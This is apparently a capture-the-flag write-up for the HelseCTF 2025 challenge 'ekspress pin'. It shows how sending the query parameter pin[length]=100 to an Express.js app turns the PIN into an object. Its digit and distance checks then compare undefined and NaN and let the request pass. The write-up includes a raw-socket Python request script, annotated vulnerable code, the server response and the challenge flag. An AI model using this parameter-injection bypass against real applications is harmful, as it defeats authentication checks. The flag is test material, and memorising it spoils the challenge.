# ekspress pin

Bare å gjette den hemmelige pinkoden, jeg gir deg til og med litt hjelp. Om du får til å levere den er et annet spørsmål.

*OBS:* Hvis HTTP 431 returneres er det en del av oppgaven, og ikke feil.

[🔗 https://helsectf2025-42694257c6fdb3976dd6-express-pin.chals.io/?pin=1234"](https://helsectf2025-42694257c6fdb3976dd6-express-pin.chals.io/?pin=1234")

[⬇️ oppgave.zip](./oppgave.zip)

# Writeup

Started by creating a script which resolved one number at a time, but that quickly stopped me due to the limited amount of bytes. Then I tried to get down to as few bytes as possible, by sending raw HTTP/0.9 request which requires no headers, just a `GET /?pin=num\r\n`. Somehow that still only gave me 99 characters.

```python
import socket, ssl

host = ("helsectf2025-42694257c6fdb3976dd6-express-pin.chals.io", 443)

pin = b"0"*99
request = b"GET /?pin="+pin+b"\r\n\r\n"
context = ssl.create_default_context()
s = socket.create_connection(host)
ssl_sock = context.wrap_socket(s, server_hostname=host[0])
ssl_sock.sendall(request)
response = ssl_sock.recv(4096)
ssl_sock.close()

# Receiving
print("> " + response.decode().replace("\n", "\n> "))
```

I could not figure out, it seems like the `\r\n` and `GET ` did not count. Not understanding what it is, even reading NodeJS source code I finally got an bright light when googling `Express Query Quirks` and finding [this](https://evanhahn.com/gotchas-with-express-query-parsing-and-how-to-avoid-them/) reminding me how express parses query strings. 

After reading the `app.js` source I see that all I really need to do is to create a object to bypass the checks, and making a object `pin['length'] = 100` will do exactly that. 

```js
const pin = { length: 100 }

// pin is not undefined as it is an "Object"
if (pin == undefined) {
  res.send("Gi en pinkode ved å bruke for eksempel <a href='/?pin=1234'>?pin=1234</a>")
  return
}

// I've manually set `length` to be 100, so it is not bigger than 100.
if (pin.length > hemmeligPin.length) {
  res.send("Pin er for lang")
  return
}

// This will loop throught pin[0], to pin[99] which will all resolve to `undefined``
// `undefined > '9' or < '0'` will be false, so it will not fail the only numbers check.
// parseInt(undefiend) == NaN, and NaN - any number will be NaN. (Not A Number). abs(NaN) == NaN
var distanse = 0
for (var i = 0; i < pin.length; i++) {
  if (pin[i] > '9' || pin[i] < '0') {
    res.send("Pin skal kun være siffer")
    return
  }
  distanse += Math.abs(parseInt(pin[i]) - parseInt(hemmeligPin[i]))
}

// Since `distance` will be `NaN`and `NaN > 0` will be false, it will not fail the distance check.
if (distanse > 0){
  res.send(`Pinkoden var feil, med en distanse på ${distanse}`)
  return
}

// pin.length I've hardcoded to be 100 so it will not fail the length check.
if (pin.length != hemmeligPin.length) {
  res.send("Alle de gitte sifrene var korrekte, men pinkoden har feil lengde")
  return
}
```

and with [solve.py](./solve.py) I got the flag!! :D 

```s
> GET /?pin[length]=100
> 
> 
> HTTP/1.1 200 OK
> X-Powered-By: Express
> Content-Type: text/html; charset=utf-8
> Content-Length: 91
> ETag: W/"5b-f3v0ndbRX56cBnmarR1wpG1ZKf0"
> Date: Sun, 23 Feb 2025 05:06:05 GMT
> Connection: close
> 
> Gratulerer, du har funnet pinkoden! Her er flagget: helsectf{3r_j4v4scr1pt_3t_3kt3_språk?}
```

# Flag

```
helsectf{3r_j4v4scr1pt_3t_3kt3_språk?}
```